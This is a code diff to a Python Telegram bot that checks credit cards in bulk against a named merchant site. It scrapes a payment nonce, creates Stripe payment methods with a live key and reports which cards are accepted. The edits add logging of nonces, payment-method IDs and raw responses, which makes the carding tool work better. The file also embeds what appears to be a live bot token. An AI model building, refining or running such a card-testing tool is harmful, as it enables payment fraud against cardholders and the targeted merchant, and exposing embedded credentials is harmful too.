@@ -13,8 +13,8 @@ logger = logging.getLogger(__name__)
 
 # Bot configuration
 TOKEN = "8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s"  # Replace with your Telegram bot token
-DOMAIN = "https://scandictech.no/"  # Updated to match the site in the image
-PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"  # Replace with the key from source if different
+DOMAIN = "https://scandictech.no/"  # Target site
+PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
 
 def parseX(data, start, end):
     try:
@@ -74,6 +74,7 @@ async def ppc(cards):
             )
             await asyncio.sleep(1)
             nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
+            logger.info(f"Nonce extracted: {nonce}")
 
             headers2 = {
                 "accept": "application/json",
@@ -125,6 +126,7 @@ async def ppc(cards):
             )
             await asyncio.sleep(1)
             pmid = parseX(req2, '"id": "', '"')
+            logger.info(f"Payment method ID: {pmid}")
 
             headers3 = {
                 "accept": "*/*",
@@ -154,8 +156,10 @@ async def ppc(cards):
                 headers=headers3,
                 data=data3,
             )
+            logger.info(f"Raw response from site: {req4}")
             return req4
     except Exception as e:
+        logger.error(f"Error in ppc: {str(e)}")
         return f"Error: {str(e)}"
 
 async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -184,7 +188,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reason = response_json.get("message", "No response message")
         except json.JSONDecodeError:
             status = "❌ Error"
-            reason = result if result else "Invalid response"
+            reason = result if result else "No response message"
 
         cc, mon, year, cvv = card.split("|")
         bin_number = cc[:6]
@@ -233,7 +237,6 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not card:
             continue
         try:
-            # Ensure card is in correct format
             cc, mon, year, cvv = card.split("|")
             result = await ppc(card)
             try:
@@ -242,7 +245,7 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reason = response_json.get("message", "No response message")
             except json.JSONDecodeError:
                 status = "<b>❌ Error</b>"
-                reason = result if result else "Invalid response"
+                reason = result if result else "No response message"
 
             response += (
                 f"<b>💳 Card:</b> <code>{card}</code>\n"
